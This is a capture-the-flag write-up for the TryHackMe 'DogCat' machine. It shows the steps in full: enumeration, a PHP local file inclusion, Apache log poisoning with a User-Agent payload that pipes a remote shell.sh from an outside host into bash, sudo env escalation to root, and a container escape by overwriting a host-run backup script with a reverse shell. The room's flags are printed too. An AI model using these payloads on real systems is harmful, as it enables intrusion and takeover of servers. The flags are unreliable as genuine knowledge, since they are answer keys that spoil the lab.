# DogCat

## Solution

Starting it as usual, with an nmap script !
```bash
cmd: sudo nmap -sC -sV -p- --min-rate 10000 -oN nmap/all $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Poking around the webserver did not produce any interesting resources, lets enumerate further
```bash
cmd: gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt,html

/.hta                 (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/cats                 (Status: 301) [Size: 313] [--> http://10.10.108.101/cats/]
/cat.php              (Status: 200) [Size: 26]
/flag.php             (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 418]
/index.php            (Status: 200) [Size: 418]
/server-status        (Status: 403) [Size: 278]
```

Visiting:
- /cats 	-> 301
- / 		-> can select cat/dog -> translates to /?view=cat
- /flag.php	-> renders = empty

The initial idea was to **/?view=flag** but it might be checking the presence of cat/dog in the query because it gives **"Only cats or dogs are allowed"**

We can carve more information from it:
- installation path -> /var/www/html/index.php
- It needs dog or cat in the file (?view=index.php ... ?view=index.php%00cats)
- Including index.php will generate an error for redeclaration (IT IS WORKING)
- Flag.php still returns empty (what is passed to include() is interpreted, duh)

Lets try some filters !! 
```bash
Request 1: http://$IP/?view=pHp://FilTer/convert.base64-encode/resource=./cat/../index.php%00 # Does not work
Request 2: http://$IP/?view=pHp://FilTer/convert.base64-encode/resource=./cat/../index # WORKS 

# Note: the result is included in the repo under the folder "files"
```

Analyzing this small index's snippet we can see several things
```php
if isset($_GET["ext"]) ? $_GET["ext"] : '.php';
    if(isset($_GET['view'])) {
	    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
			echo 'Here you go!';
			include $_GET['view'] . $ext;

```

With this, we can load any file just by proiding an empty **ext**ension. Lets get the flag though with both tricks :D

```php
// cmd: curl -X GET "http://$IP/?ext=&view=pHp://FilTer/convert.base64-encode/resource=./dogs/../flag.php"

// Response's content: PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=

// Decoded response
<?php
$flag_1 = THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
?>
```

**Flag 1:** ```THM{Th1s_1s_N0t_4_Catdog_ab67edfa}```

Next step is to achieve RCE. At this point i got a bit lost although i had the correct idea: Tamper with some file and evaluate it with the include 

I then found out that **apache logs** include the user-agent header in them so, with this, we can inject php code via the header and execute the log by including it with the LFI found. 

```bash
# Injecting the header
cmd: curl -X GET "http://$IP/?ext=&view=./dogs/../flag.php" -H "User-Agent: Mozilla <?php system('curl http://10.9.128.84/shell.sh | bash'); ?> Gecko"

# Trigger RCE
cmd: curl -X GET "http://$IP/?ext=&view=./dogs/../../../../../var/log/apache2/access.log"

# Reverse shell listener
cmd: whoami && id

www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Lets check the system around

```bash
# getting the second flag
cmd: ls -la

drwxr-xr-x 1 root     root     4096 Mar 10  2020 .
drwxr-xr-x 1 root     root     4096 Feb 26  2020 ..
-rw-r--r-- 1 root     root       23 Mar 10  2020 flag2_QMW7JvaY2LvK.txt
drwxrwxrwx 4 www-data www-data 4096 Jul 30 10:21 html

cmd: cat flag2_QMW7JvaY2LvK.txt

THM{LF1_t0_RC3_aec3fb}
```

**Flag 2:** ```THM{LF1_t0_RC3_aec3fb}```

By enumerating the system manually, i found a folder containing a **shell script** and a **tar compressed file** at **/opt/backups**

```bash
cmd: cat backup.sh

#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

So it seems that this is being executed from outside of the container (because of how the destination path is declared)

By decompressing the **.tar** file, it extracted a folder named **root** containing another folder named **container**. It contained some spicy things
```bash
cmd: ls -la

drwxr-xr-x 5 www-data www-data 4096 Mar 10  2020 .
drwxr-xr-x 3 www-data www-data 4096 Jul 30 10:54 ..
drwxr-xr-x 8 www-data www-data 4096 Mar  6  2020 .git
-rw-r--r-- 1 www-data www-data  733 Mar 10  2020 Dockerfile # <-- file to build the docker image, contains flag
drwxr-xr-x 2 www-data www-data 4096 Apr  8  2020 backup 	# <-- /opt/backup
-rwxr-xr-x 1 www-data www-data   83 Mar 10  2020 launch.sh	
drwxr-xr-x 4 www-data www-data 4096 Mar 10  2020 src		# <-- /var/www/html 

cmd: cat DockerFile

# -- snip -- 

# Set up escalation
RUN chmod +s `which env`
RUN apt-get update && apt-get install sudo -y
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers# Set up escalation
RUN chmod +s `which env`
RUN apt-get update && apt-get install sudo -y
RUN echo "www-data ALL = NOPASSWD: `which env`" >> /etc/sudoers

# -- snip --

RUN echo "THM{D1ff3r3nt_3nv1ronments_874112}" > /root/flag3.txt

# -- snip --

```

**Flag 3:** ```THM{D1ff3r3nt_3nv1ronments_874112}```

We got the third flag as well as the method to escalate to root !! with GTFOBins help, we can do the following as **www-data**
```bash
# cmd: sudo env /bin/bash
# cmd: whoami && id
root
uid=0(root) gid=0(root) groups=0(root)
```

Well, now we need to escape the container but it does not have any indication that it is the common method of exploitation (by mounting the host file system)... Lets try to modify the shell script seen before and see if the host has scheduling jobs to execute it

I just replaced the shell script contents with a reverse shell and voila
```bash
cmd: cat ~/flag4.txt

THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

**Flag 4:** ```THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}```

